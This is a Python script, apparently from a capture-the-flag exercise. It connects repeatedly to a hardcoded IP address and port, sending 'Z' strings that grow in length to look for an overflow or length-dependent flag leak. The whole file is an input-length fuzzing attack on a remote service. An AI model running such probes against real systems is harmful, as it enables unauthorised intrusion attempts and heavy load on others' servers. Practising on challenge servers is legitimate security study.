import socket

HOST = "129.241.200.165"
PORT = 3200

DAMN_FLAG = "Trying to print the damn flag!!! \n"
LETTER = "Z"
START = 100_100
END = 101_000
INCREMENT = 1

data = b""
attempts = 0
failures = 0
timeouts = 0
res_lens = []
interesting = []

try:
    for n in range(START, END + 1, INCREMENT):
        attempts += 1
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3)
            s.connect((HOST, PORT))
            spam = LETTER * (n - 1) + "\n"
            message = bytes(spam, "utf-8")
            sent = s.send(message)  # for manual sanity check
            # print(f"{sent=}")
            try:
                data = s.recv(1048576)
            except socket.timeout:
                print(f"timeout {n=}")
                timeouts += 1
                continue
        res = data.decode()
        res_lens.append(len(res))
        res_letters = res.count(LETTER)
        # easier manual scanning of output
        res_filtered = res.replace(LETTER, "").replace("\n", "")
        if res == f"{DAMN_FLAG}" or res == f"{DAMN_FLAG}\nNOOO! Wrong input: {spam}\n":
            failures += 1
            continue
        if res:
            if not "Wrong input" in res:
                print(f"{n=} {res_letters=} {res}")
                interesting.append(
                    {
                        "n": n,
                        "letters": res_letters,
                        "res": res,
                    }
                )
            else:
                print(f"{n=} {res_letters=} {res_filtered=}")
except KeyboardInterrupt:
    print("killed")
finally:
    avg_res_length = sum(res_lens) / len(res_lens) if len(res_lens) > 0 else None
    print(f"{n=} {attempts=} {failures=} {timeouts=} {avg_res_length=}")
    print("interesting:")
    for e in interesting:
        print(repr(e))
